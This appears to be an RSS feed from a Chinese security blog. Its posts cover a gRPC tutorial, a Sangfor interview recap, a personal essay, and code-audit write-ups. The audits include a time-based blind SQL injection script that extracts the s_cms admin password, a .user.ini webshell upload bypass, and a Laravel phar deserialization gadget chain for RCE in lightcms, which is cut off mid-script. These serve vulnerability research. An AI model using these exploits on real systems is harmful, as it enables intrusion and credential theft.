could not greet: rpc error: <span class="nv">code</span> <span class="o">=</span> Unauthenticated <span class="nv">desc</span> <span class="o">=</span> Token认证信息无效: <span class="nv">id</span><span class="o">=</span>666666, <span class="nv">key</span><span class="o">=</span>hack
$ go run main.go 
Greeting: HelloTheoyu !
</code></pre></div><h3 id="拦截器">拦截器</h3>
<p>上述栗子可以看到..我们的认证是写到Service的方法里面，如果有多个Service，相当于服务端每一个方法都需要写入认证。grpc服务端和客户端都提供了<strong>interceptor</strong>功能，很适合去处理验证、日志等流程。</p>
<p>拦截器写在客户端可以用于打印一些时间，日志等信息，不过这里只需要修改服务端即可。</p>
<p>我们把服务端<code>Sayhello</code>中认证的部分提出来，写到<code>auth</code> 函数中。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="nf">interceptor</span><span class="p">(</span><span class="nx">ctx</span> <span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">,</span> <span class="nx">req</span> <span class="kd">interface</span><span class="p">{},</span> <span class="nx">info</span> <span class="o">*</span><span class="nx">grpc</span><span class="p">.</span><span class="nx">UnaryServerInfo</span><span class="p">,</span> <span class="nx">handler</span> <span class="nx">grpc</span><span class="p">.</span><span class="nx">UnaryHandler</span><span class="p">)</span> <span class="p">(</span><span class="kd">interface</span><span class="p">{},</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
	<span class="nx">err</span><span class="o">:=</span><span class="nf">auth</span><span class="p">(</span><span class="nx">ctx</span><span class="p">)</span>
	<span class="k">if</span> <span class="nx">err</span><span class="o">!=</span><span class="kc">nil</span><span class="p">{</span>
		<span class="k">return</span> <span class="kc">nil</span><span class="p">,</span><span class="nx">err</span>
	<span class="p">}</span>
	<span class="c1">//continue
</span><span class="c1"></span>	<span class="k">return</span> <span class="nf">handler</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span><span class="nx">req</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></div><p>在主函数中创建<code> []grpc.ServerOption</code>,这里初始化的步骤和Client很像：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kd">var</span> <span class="nx">opts</span> <span class="p">[]</span><span class="nx">grpc</span><span class="p">.</span><span class="nx">ServerOption</span>
<span class="nx">opts</span> <span class="p">=</span> <span class="nb">append</span><span class="p">(</span><span class="nx">opts</span><span class="p">,</span> <span class="nx">grpc</span><span class="p">.</span><span class="nf">UnaryInterceptor</span><span class="p">(</span><span class="nx">interceptor</span><span class="p">))</span>

<span class="nx">s</span><span class="o">:=</span><span class="nx">grpc</span><span class="p">.</span><span class="nf">NewServer</span><span class="p">(</span><span class="nx">opts</span><span class="o">...</span><span class="p">)</span>
<span class="nx">pb</span><span class="p">.</span><span class="nf">RegisterGreeterServer</span><span class="p">(</span><span class="nx">s</span><span class="p">,</span><span class="o">&amp;</span><span class="nx">server</span><span class="p">{})</span>
</code></pre></div><h3 id="中间件">中间件</h3>
<p>其实用到拦截器的时候我就有一些疑惑，因为这个功能用起来和中间件没什么区别，但实际上gRPC中只能设置一个拦截器，这就会导致一大堆功能写在里面会比较乱。第三方<a href="https://github.com/grpc-ecosystem/go-grpc-middleware">go-grpc-middleware</a>封装了认证（auth）, 日志（ logging）, 消息（message）, 验证（validation）, 重试（retries） 和监控（retries）等拦截器。可以供稍微重量一些的开发使用。</p>
<h2 id="one-case">one case</h2>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/08/20210808210938.png" alt=""></p>
<p>简易聊天室：<a href="https://github.com/yuuuuu422/Go-Toys/tree/main/g-talk">github</a></p>
]]></content>
		</item>
		
		<item>
			<title>闪灵cms前台注入&#43;后台getshell</title>
			<link>https://theoyu.top/posts/codeaudit/s_cms/</link>
			<pubDate>Fri, 16 Jul 2021 17:19:18 +0800</pubDate>
			
			<guid>https://theoyu.top/posts/codeaudit/s_cms/</guid>
			<description>题目给了sql文件，其中管理员密码进行了更改。
前台注入 web界面非常美观，admin路由下是登陆界面，同时有滑动条的检测，爆破的思路肯定走不通。看一下源码对登陆处的数据处理。
在function/function.php下可以看到：
在check_input下都调用了addslashes,同时还有许多的过滤那常规注入是走不通了，这里巧的地方在于转义只对value进行了转义。
看看function/form.php，关键点在第162行。
mysqli_query($conn,&amp;#34;Insert into &amp;#34;.TABLE.&amp;#34;response(R_cid,R_content,R_time,R_rid,R_member,R_ip) values(&amp;#34;.$x.&amp;#34;,&amp;#39;&amp;#34;.htmlspecialchars($y).&amp;#34;&amp;#39;,&amp;#39;&amp;#34;.$R_time.&amp;#34;&amp;#39;,&amp;#39;&amp;#34;.$R_rid.&amp;#34;&amp;#39;,&amp;#34;.$M_id.&amp;#34;,&amp;#39;&amp;#34;.getip().&amp;#34;&amp;#39;)&amp;#34;); 这在一个嵌套了很多层的if语句内，根据走向前提交一个test
http://127.0.0.1/cms/s_cms/web/function/form.php?action=inputPOST:1-sleep(5)=xxx成功延迟了5s,也就是之前对key没有进行检查造成的伏笔。
import requests,time x = [str(x) for x in range(0, 10)] y = [chr(y) for y in range(97, 123)] dic = x+y url = &amp;#39;http://127.0.0.1/cms/s_cms/web/function/form.php?action=input&amp;#39; result=&amp;#39;&amp;#39; for i in range(1,33): for j in dic: data={ &amp;#34;1-if((select(substr(A_pwd,{},1))from/**/SL_admin)=&amp;#39;{}&amp;#39;,sleep(3),1)&amp;#34;.format(i,j):&amp;#34;xxx&amp;#34; } startTime = time.time() res = requests.post(url=url,data=data) endTime = time.time() if endTime - startTime &amp;gt; 3: result=result+j print(&amp;#39;[+] &amp;#39;+result) break 后台getshell 后台的功能挺多的，但是翻了很久都没能找到可以利用的点，无意见翻到这个检测更新：</description>
			<content type="html"><![CDATA[<p>题目给了sql文件，其中管理员密码进行了更改。</p>
<h2 id="前台注入">前台注入</h2>
<p>web界面非常美观，<strong>admin</strong>路由下是登陆界面，同时有滑动条的检测，爆破的思路肯定走不通。看一下源码对登陆处的数据处理。</p>
<p>在<code>function/function.php</code>下可以看到：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/07/20210728215118.png" alt=""></p>
<p>在<code>check_input</code>下都调用了<code>addslashes</code>,同时还有许多的过滤那常规注入是走不通了，这里巧的地方在于转义只对<code>value</code>进行了转义。</p>
<p>看看<code>function/form.php</code>，关键点在第162行。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span><span class="s2">&#34;Insert into &#34;</span><span class="o">.</span><span class="nx">TABLE</span><span class="o">.</span><span class="s2">&#34;response(R_cid,R_content,R_time,R_rid,R_member,R_ip) values(&#34;</span><span class="o">.</span><span class="nv">$x</span><span class="o">.</span><span class="s2">&#34;,&#39;&#34;</span><span class="o">.</span><span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$y</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;&#39;,&#39;&#34;</span><span class="o">.</span><span class="nv">$R_time</span><span class="o">.</span><span class="s2">&#34;&#39;,&#39;&#34;</span><span class="o">.</span><span class="nv">$R_rid</span><span class="o">.</span><span class="s2">&#34;&#39;,&#34;</span><span class="o">.</span><span class="nv">$M_id</span><span class="o">.</span><span class="s2">&#34;,&#39;&#34;</span><span class="o">.</span><span class="nx">getip</span><span class="p">()</span><span class="o">.</span><span class="s2">&#34;&#39;)&#34;</span><span class="p">);</span>
</code></pre></div><p>这在一个嵌套了很多层的if语句内，根据走向前提交一个test</p>
<pre><code>http://127.0.0.1/cms/s_cms/web/function/form.php?action=input
POST:1-sleep(5)=xxx
</code></pre><p>成功延迟了5s,也就是之前对<code>key</code>没有进行检查造成的伏笔。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span><span class="o">,</span><span class="nn">time</span>
<span class="n">x</span> <span class="o">=</span> <span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">)]</span>
<span class="n">y</span> <span class="o">=</span> <span class="p">[</span><span class="nb">chr</span><span class="p">(</span><span class="n">y</span><span class="p">)</span> <span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">97</span><span class="p">,</span> <span class="mi">123</span><span class="p">)]</span>
<span class="n">dic</span> <span class="o">=</span> <span class="n">x</span><span class="o">+</span><span class="n">y</span>
<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://127.0.0.1/cms/s_cms/web/function/form.php?action=input&#39;</span>
<span class="n">result</span><span class="o">=</span><span class="s1">&#39;&#39;</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">33</span><span class="p">):</span>    
    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">dic</span><span class="p">:</span>        
        <span class="n">data</span><span class="o">=</span><span class="p">{</span>            <span class="s2">&#34;1-if((select(substr(A_pwd,</span><span class="si">{}</span><span class="s2">,1))from/**/SL_admin)=&#39;</span><span class="si">{}</span><span class="s2">&#39;,sleep(3),1)&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">):</span><span class="s2">&#34;xxx&#34;</span>        <span class="p">}</span>        
        <span class="n">startTime</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>        
        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>        
        <span class="n">endTime</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>        
        <span class="k">if</span> <span class="n">endTime</span> <span class="o">-</span> <span class="n">startTime</span> <span class="o">&gt;</span> <span class="mi">3</span><span class="p">:</span>            
            <span class="n">result</span><span class="o">=</span><span class="n">result</span><span class="o">+</span><span class="n">j</span>            
            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[+] &#39;</span><span class="o">+</span><span class="n">result</span><span class="p">)</span>            
            <span class="k">break</span>
</code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/07/20210728232719.png" alt=""></p>
<h2 id="后台getshell">后台getshell</h2>
<p>后台的功能挺多的，但是翻了很久都没能找到可以利用的点，无意见翻到这个检测更新：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/07/20210728233819.png" alt=""></p>
<p>可以得知我们当前版本是存在文件上传漏洞的，看一看<code>function/upload.php</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/07/20210728235433.png" alt=""></p>
<p>这里文件上传是一个黑名单+白名单的检测，但是黑名单里并没有<code>ini</code>，我们可以在安全设置里自定义<code>$S_filetype</code>，先随便传一个图片🐎，再传一个<code>.user.ini</code>文件</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ini" data-lang="ini"><span class="na">auto_prepend_file</span><span class="o">=</span><span class="s">theoyu.png</span>
</code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/07/20210729000801.png" alt=""></p>
]]></content>
		</item>
		
		<item>
			<title>深信服面试</title>
			<link>https://theoyu.top/posts/sangfor_interview/</link>
			<pubDate>Wed, 23 Jun 2021 11:30:20 +0800</pubDate>
			
			<guid>https://theoyu.top/posts/sangfor_interview/</guid>
			<description>一面 一面是一位非常和蔼的师傅，整体属于自我驱动谈话，也就是简历上面写了什么问什么吧，40分钟基本上全是我在说，然后他提一些建议之类的。
自我介绍一下 3分钟 聊一聊SSRF 8分钟左右 聊的比较深入 聊一聊反序列化 5分钟 最后师傅忽然提了一句java反序列化知道多少，尬住了，师傅语重心长的说web研究的话java很重要，得好好学&amp;hellip;
谈一谈徐州护网 3分钟 PHP源码分析过吗 8分钟左右 聊到了一个php垃圾回收的pwn，奈何我二进制太弱，不过还好后来把话题聊到了disable_function的绕过，这一块还是谈了挺久的。师傅说二进制也很重要，给我推荐了一些二进制的书籍。
谈一谈代码审计的流程 5分钟左右 你觉得seay好用吗，你觉得理想的静态分析工具该满足怎样的功能。 我说seay这种基于正则的不太行了，感觉师傅应该想聊聊AST，虽然接触过这一块不过我感觉没有具体实践的话很难交流，马马虎虎的过去了。
谈一谈内网渗透 3分钟 聊一聊你写的一些小工具 5分钟 谈的比较久的就是子域名爆破，其实不算爆破，利用浏览器api和dns协议而已，爆破这一块做的不好，但师傅对爆破的算法比较感兴趣，我也老实说了之前在一位蘑菇街师傅博客看到的自动生成字典思路以及泛解析对策。
你有什么想问我的？ 这一块聊的挺舒服的，感觉师傅啥也会，我也没太多顾忌了就说我什么什么不会，师傅说咋学，最后问了下可能做什么，师傅说实习生不太确定，二面才可能清楚。
二面 30分钟 自我介绍一下 2分钟 学了哪些专业课 数据结构学的怎么样 怎么在代码层面防御SSRF 3分钟 如何检测webshell 5分钟 先谈了正则，聊了php5和php7特性这一块，然后就是特征流量，没有怎么接触过回答比较勉强。
谈一谈你用过的webshell ，分析过流量特征吗？如何进行数据交互的？ 8分钟 正向shell反向shell，为什么正向shell容易被检测 3分钟 端口转发和端口映射的区别，内网怎么进行流量转发？3分钟 谈一谈内存马 不会java真的很尴尬，不过师傅也没说什么。
如何实时检测反弹shell 5分钟 你有什么想问我的？ 问了如果去大概是做什么方向，师傅说和他今天问的差不多，入侵检测这一块，偏研发。
hr面 等了差不多一个多星期，本来觉得应该差不多无了。
自我介绍一下 你们大二还没有开信安专业课吧。平时怎么自学的？ 平时在社团负责什么方面的工作 平时关注了哪些论坛或者公众号？ 家庭情况 平时喜欢玩什么游戏 未来方向 总结 hr面完后过了一天就发了offer，感觉安全这一块，首先当然得追求广度，不然面试说一个知识点你直接说没听过很尴尬。但又不能在你不熟悉的领域说太多，自己有几斤几两大师傅一追问就能听出来，这样就需要深度了。平时遇到的一些零碎知识多总结，多实践。可能我是大二的原因所以在项目这一块没有追问太多，记得hr和二面的师傅介绍我就一句:&amp;ldquo;他简历比较简单，你看一看就能开始了&amp;rdquo;。我们最后所学的，所分析的，还是得落实到代码上去。talk is cheap,show me the code.</description>
			<content type="html"><![CDATA[<h2 id="一面">一面</h2>
<p>一面是一位非常和蔼的师傅，整体属于自我驱动谈话，也就是简历上面写了什么问什么吧，40分钟基本上全是我在说，然后他提一些建议之类的。</p>
<h3 id="自我介绍一下-3分钟">自我介绍一下 3分钟</h3>
<h3 id="聊一聊ssrf-8分钟左右-聊的比较深入">聊一聊SSRF 8分钟左右 聊的比较深入</h3>
<h3 id="聊一聊反序列化-5分钟">聊一聊反序列化 5分钟</h3>
<p>最后师傅忽然提了一句java反序列化知道多少，尬住了，师傅语重心长的说web研究的话java很重要，得好好学&hellip;</p>
<h3 id="谈一谈徐州护网-3分钟">谈一谈徐州护网 3分钟</h3>
<h3 id="php源码分析过吗-8分钟左右">PHP源码分析过吗 8分钟左右</h3>
<p>聊到了一个php垃圾回收的pwn，奈何我二进制太弱，不过还好后来把话题聊到了<strong>disable_function</strong>的绕过，这一块还是谈了挺久的。师傅说二进制也很重要，给我推荐了一些二进制的书籍。</p>
<h3 id="谈一谈代码审计的流程-5分钟左右">谈一谈代码审计的流程 5分钟左右</h3>
<h3 id="你觉得seay好用吗你觉得理想的静态分析工具该满足怎样的功能">你觉得seay好用吗，你觉得理想的静态分析工具该满足怎样的功能。</h3>
<p>我说seay这种基于正则的不太行了，感觉师傅应该想聊聊AST，虽然接触过这一块不过我感觉没有具体实践的话很难交流，马马虎虎的过去了。</p>
<h3 id="谈一谈内网渗透-3分钟">谈一谈内网渗透 3分钟</h3>
<h3 id="聊一聊你写的一些小工具-5分钟">聊一聊你写的一些小工具 5分钟</h3>
<p>谈的比较久的就是子域名爆破，其实不算爆破，利用浏览器api和dns协议而已，爆破这一块做的不好，但师傅对爆破的算法比较感兴趣，我也老实说了之前在一位蘑菇街师傅博客看到的自动生成字典思路以及泛解析对策。</p>
<h3 id="你有什么想问我的">你有什么想问我的？</h3>
<p>这一块聊的挺舒服的，感觉师傅啥也会，我也没太多顾忌了就说我什么什么不会，师傅说咋学，最后问了下可能做什么，师傅说实习生不太确定，二面才可能清楚。</p>
<h2 id="二面-30分钟">二面 30分钟</h2>
<h3 id="自我介绍一下-2分钟">自我介绍一下 2分钟</h3>
<h3 id="学了哪些专业课-数据结构学的怎么样">学了哪些专业课 数据结构学的怎么样</h3>
<h3 id="怎么在代码层面防御ssrf-3分钟">怎么在代码层面防御SSRF 3分钟</h3>
<h3 id="如何检测webshell-5分钟">如何检测webshell 5分钟</h3>
<p>先谈了正则，聊了php5和php7特性这一块，然后就是特征流量，没有怎么接触过回答比较勉强。</p>
<h3 id="谈一谈你用过的webshell-分析过流量特征吗如何进行数据交互的-8分钟">谈一谈你用过的webshell ，分析过流量特征吗？如何进行数据交互的？ 8分钟</h3>
<h3 id="正向shell反向shell为什么正向shell容易被检测-3分钟">正向shell反向shell，为什么正向shell容易被检测 3分钟</h3>
<h3 id="端口转发和端口映射的区别内网怎么进行流量转发3分钟">端口转发和端口映射的区别，内网怎么进行流量转发？3分钟</h3>
<h3 id="谈一谈内存马">谈一谈内存马</h3>
<p>不会java真的很尴尬，不过师傅也没说什么。</p>
<h3 id="如何实时检测反弹shell-5分钟">如何实时检测反弹shell 5分钟</h3>
<h3 id="你有什么想问我的-1">你有什么想问我的？</h3>
<p>问了如果去大概是做什么方向，师傅说和他今天问的差不多，入侵检测这一块，偏研发。</p>
<h2 id="hr面">hr面</h2>
<p>等了差不多一个多星期，本来觉得应该差不多无了。</p>
<h3 id="自我介绍一下">自我介绍一下</h3>
<h3 id="你们大二还没有开信安专业课吧平时怎么自学的">你们大二还没有开信安专业课吧。平时怎么自学的？</h3>
<h3 id="平时在社团负责什么方面的工作">平时在社团负责什么方面的工作</h3>
<h3 id="平时关注了哪些论坛或者公众号">平时关注了哪些论坛或者公众号？</h3>
<h3 id="家庭情况">家庭情况</h3>
<h3 id="平时喜欢玩什么游戏">平时喜欢玩什么游戏</h3>
<h3 id="未来方向">未来方向</h3>
<h2 id="总结">总结</h2>
<p>hr面完后过了一天就发了offer，感觉安全这一块，首先当然得追求广度，不然面试说一个知识点你直接说没听过很尴尬。但又不能在你不熟悉的领域说太多，自己有几斤几两大师傅一追问就能听出来，这样就需要深度了。平时遇到的一些零碎知识多总结，多实践。可能我是大二的原因所以在项目这一块没有追问太多，记得hr和二面的师傅介绍我就一句:&ldquo;他简历比较简单，你看一看就能开始了&rdquo;。我们最后所学的，所分析的，还是得落实到代码上去。<code>talk is cheap,show me the code.</code></p>
]]></content>
		</item>
		
		<item>
			<title>something0x01</title>
			<link>https://theoyu.top/posts/essay/%E9%9A%8F%E7%AC%940x01/</link>
			<pubDate>Mon, 14 Jun 2021 23:30:32 +0800</pubDate>
			
			<guid>https://theoyu.top/posts/essay/%E9%9A%8F%E7%AC%940x01/</guid>
			<description>很多事情，关于学习，关于比赛，关于团队，关于&amp;hellip;
晚饭结束和弟弟打了一个电话，他说不到一个月就小升初考试了，很紧张，安慰了他一下。妈妈寄了一些粽子，不过应该还得过几天才能到。
想了想还是全删掉了，未来可期。</description>
			<content type="html"><![CDATA[<p>很多事情，关于学习，关于比赛，关于团队，关于&hellip;</p>
<p>晚饭结束和弟弟打了一个电话，他说不到一个月就小升初考试了，很紧张，安慰了他一下。妈妈寄了一些粽子，不过应该还得过几天才能到。</p>
<p>想了想还是全删掉了，未来可期。</p>
]]></content>
		</item>
		
		<item>
			<title>lightcms 1.3.7rce</title>
			<link>https://theoyu.top/posts/codeaudit/lightcms/</link>
			<pubDate>Sat, 12 Jun 2021 17:19:18 +0800</pubDate>
			
			<guid>https://theoyu.top/posts/codeaudit/lightcms/</guid>
			<description>lightCMS是一个轻量级的CMS系统，基于Laravel 6.x开发，前端框架基于layui。
在后台/admin/entity/2/contents/create处，我们可以上传图片。
通过js的event，我们可以看到与php的绑定。
看一下源码：
跟进isValidImage：
config配置在/config/light.php下：
同时，代码在Intervention\Image\Facades\Image还对图片进行了一次解析，不过这次比较松散，只要GIF89a文件头就可以绕过。
正是基于laravel框架，我们可以很容易找到一条可以利用的反序列化链，同时对文件上传的松散我们可以构造rce的phar文件，那么现在需要明确的一点也就是找到可以触发phar的地方。
与文件上传同处，可以发现一处catchImage:
该函数可以通过post请求，下载外部图片于本地。在下载前，有一处fetchImageFile对文件进行检测，我们跟进观察：
POST /admin/neditor/serve/catchImagefile=http://127.0.0.1/theoyu.txt可以看到这里开启了curl对我们的文件进行了请求，最后对我们$data内容进行一次判断，不为Webp格式的话则进入Image::make，不断调试，最后我们将顺利走到init()处:
我们重点关注isUrl()处，因为可以发现initFromUrl中：
会触发file_get_contents进行解析，而该函数可以完美触发phar,接下来看看对isUrl()的处理。
public function isUrl() { return (bool) filter_var($this-&amp;gt;data, FILTER_VALIDATE_URL); } 可以说是非常友好，对于FILTER_VALIDATE_URL只要满足xxx://xxx格式即可，而我们要想触发phar:// 数据流包装器本身也满足该需求。
我们重新回过来分析：
 上传phar文件。 在服务器上部署任意可访问文件,内容为phar://phar文件地址 通过catchImage下载该文件，在判断文件内容时触发本地phar,达到rce。  phar用以下脚本构造即可：
&amp;lt;?php namespace Illuminate\Broadcasting{ class PendingBroadcast { protected $events; protected $event; public function __construct($events, $event) { $this-&amp;gt;events = $events; $this-&amp;gt;event = $event; } } class BroadcastEvent { protected $connection; public function __construct($connection) { $this-&amp;gt;connection = $connection; } } } namespace Illuminate\Bus{ class Dispatcher{ protected $queueResolver; public function __construct($queueResolver) { $this-&amp;gt;queueResolver = $queueResolver; } } } namespace{ $command = new Illuminate\Broadcasting\BroadcastEvent(&amp;#39;whoami&amp;#39;); $dispater = new Illuminate\Bus\Dispatcher(&amp;#34;system&amp;#34;); $PendingBroadcast = new Illuminate\Broadcasting\PendingBroadcast($dispater,$command); $phar = new Phar(&amp;#39;phar.</description>
			<content type="html"><![CDATA[<p><code>lightCMS</code>是一个轻量级的<code>CMS</code>系统，基于<code>Laravel 6.x</code>开发，前端框架基于<code>layui</code>。</p>
<p>在后台<code>/admin/entity/2/contents/create</code>处，我们可以上传图片。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-16-image-20210616174448320.png" alt="image-20210616174448320"></p>
<p>通过js的event，我们可以看到与php的绑定。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-16-image-20210616174924679.png" alt="image-20210616174924679"></p>
<p>看一下源码：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-16-image-20210616183345964.png" alt="image-20210616183345964"></p>
<p>跟进<code>isValidImage</code>：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-16-image-20210616183519683.png" alt="image-20210616183519683"></p>
<p><code>config</code>配置在<code>/config/light.php</code>下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-16-image-20210616191616366.png" alt="image-20210616191616366"></p>
<p>同时，代码在<code>Intervention\Image\Facades\Image</code>还对图片进行了一次解析，不过这次比较松散，只要<strong>GIF89a</strong>文件头就可以绕过。</p>
<p>正是基于laravel框架，我们可以很容易找到一条可以利用的反序列化链，同时对文件上传的松散我们可以构造rce的phar文件，那么现在需要明确的一点也就是找到可以触发phar的地方。</p>
<p>与文件上传同处，可以发现一处<code>catchImage</code>:</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-16-image-20210616192655410.png" alt="image-20210616192655410"></p>
<p>该函数可以通过post请求，下载外部图片于本地。在下载前，有一处<code>fetchImageFile</code>对文件进行检测，我们跟进观察：</p>
<pre><code>POST /admin/neditor/serve/catchImage
file=http://127.0.0.1/theoyu.txt
</code></pre><p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-16-image-20210616193421841.png" alt="image-20210616193421841"></p>
<p>可以看到这里开启了<code>curl</code>对我们的文件进行了请求，最后对我们<code>$data</code>内容进行一次判断，不为<strong>Webp</strong>格式的话则进入<code>Image::make</code>，不断调试，最后我们将顺利走到<code>init()</code>处:</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-16-image-20210616195743275.png" alt="image-20210616195743275"></p>
<p>我们重点关注<code>isUrl()</code>处，因为可以发现<code>initFromUrl</code>中：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-16-image-20210616195929712.png" alt="image-20210616195929712"></p>
<p>会触发file_get_contents进行解析，而该函数可以完美触发phar,接下来看看对<code>isUrl()</code>的处理。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php">    <span class="k">public</span> <span class="k">function</span> <span class="nf">isUrl</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="nx">filter_var</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">,</span> <span class="nx">FILTER_VALIDATE_URL</span><span class="p">);</span>
    <span class="p">}</span>
</code></pre></div><p>可以说是非常友好，对于<code>FILTER_VALIDATE_URL</code>只要满足<code>xxx://xxx</code>格式即可，而我们要想触发<code>phar://</code> 数据流包装器本身也满足该需求。</p>
<p>我们重新回过来分析：</p>
<ol>
<li>上传phar文件。</li>
<li>在服务器上部署任意可访问文件,内容为<code>phar://phar文件地址</code></li>
<li>通过<code>catchImage</code>下载该文件，在判断文件内容时触发本地phar,达到rce。</li>
</ol>
<p>phar用以下脚本构造即可：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>

<span class="k">namespace</span> <span class="nx">Illuminate\Broadcasting</span><span class="p">{</span>
    <span class="k">class</span> <span class="nc">PendingBroadcast</span>
    <span class="p">{</span>
        <span class="k">protected</span> <span class="nv">$events</span><span class="p">;</span>
        <span class="k">protected</span> <span class="nv">$event</span><span class="p">;</span>

        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$events</span><span class="p">,</span> <span class="nv">$event</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">events</span> <span class="o">=</span> <span class="nv">$events</span><span class="p">;</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">event</span> <span class="o">=</span> <span class="nv">$event</span><span class="p">;</span>
        <span class="p">}</span>

    <span class="p">}</span>

    <span class="k">class</span> <span class="nc">BroadcastEvent</span>
    <span class="p">{</span>
      <span class="k">protected</span> <span class="nv">$connection</span><span class="p">;</span>

      <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$connection</span><span class="p">)</span>
      <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">connection</span> <span class="o">=</span> <span class="nv">$connection</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>

<span class="p">}</span>

<span class="k">namespace</span> <span class="nx">Illuminate\Bus</span><span class="p">{</span>
    <span class="k">class</span> <span class="nc">Dispatcher</span><span class="p">{</span>
        <span class="k">protected</span> <span class="nv">$queueResolver</span><span class="p">;</span>

        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$queueResolver</span><span class="p">)</span>
        <span class="p">{</span>
          <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">queueResolver</span> <span class="o">=</span> <span class="nv">$queueResolver</span><span class="p">;</span>
        <span class="p">}</span>

    <span class="p">}</span>
<span class="p">}</span>

<span class="k">namespace</span><span class="p">{</span>
    <span class="nv">$command</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Illuminate\Broadcasting\BroadcastEvent</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">);</span>

    <span class="nv">$dispater</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Illuminate\Bus\Dispatcher</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">);</span>

    <span class="nv">$PendingBroadcast</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Illuminate\Broadcasting\PendingBroadcast</span><span class="p">(</span><span class="nv">$dispater</span><span class="p">,</span><span class="nv">$command</span><span class="p">);</span>
    <span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s1">&#39;phar.phar&#39;</span><span class="p">);</span>
    <span class="nv">$phar</span> <span class="o">-&gt;</span> <span class="na">stopBuffering</span><span class="p">();</span>
    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s2">&#34;GIF89a&#34;</span><span class="o">.</span><span class="s2">&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;</span><span class="p">);</span> 
